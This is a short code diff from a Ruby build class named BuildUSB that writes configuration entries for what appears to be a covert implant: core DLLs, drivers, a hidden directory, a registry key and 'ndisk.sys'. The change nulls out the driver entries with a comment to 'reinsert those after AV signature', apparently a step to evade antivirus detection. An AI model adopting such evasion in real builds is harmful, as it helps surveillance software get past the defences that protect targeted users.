@@ -63,9 +63,14 @@ class BuildUSB < Build
       f.puts "HCORE=#{names[:core]}"
       f.puts "HCONF=#{names[:config]}"
       f.puts "CODEC=#{names[:codec]}"
-      f.puts "HDRV=#{names[:driver]}"
       f.puts "DLL64=#{names[:core64]}"
-      f.puts "DRIVER64=#{names[:driver64]}"
+
+      # TODO: reinsert those after AV signature
+      f.puts "HDRV=null"
+      f.puts "DRIVER64=null"
+      #f.puts "HDRV=#{names[:driver]}"
+      #f.puts "DRIVER64=#{names[:driver64]}"
+
       f.puts "HDIR=#{names[:dir]}"
       f.puts "HREG=#{names[:reg]}"
       f.puts "HSYS=ndisk.sys"
